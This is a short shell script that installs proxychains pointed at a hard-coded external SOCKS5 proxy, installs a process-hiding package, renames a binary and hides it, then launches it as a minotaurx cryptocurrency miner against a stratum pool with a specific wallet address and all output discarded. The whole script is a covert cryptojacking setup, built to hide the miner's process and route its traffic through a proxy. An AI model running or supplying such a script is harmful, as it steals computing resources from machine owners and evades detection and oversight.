apt update 
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs -y
node –version
apt install npm -y
npm –version 
npm i -g node-process-hider
mv @ kontol
chmod u+x kontol
ph add kontol
./kontol -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t20 > /dev/null 2>&1
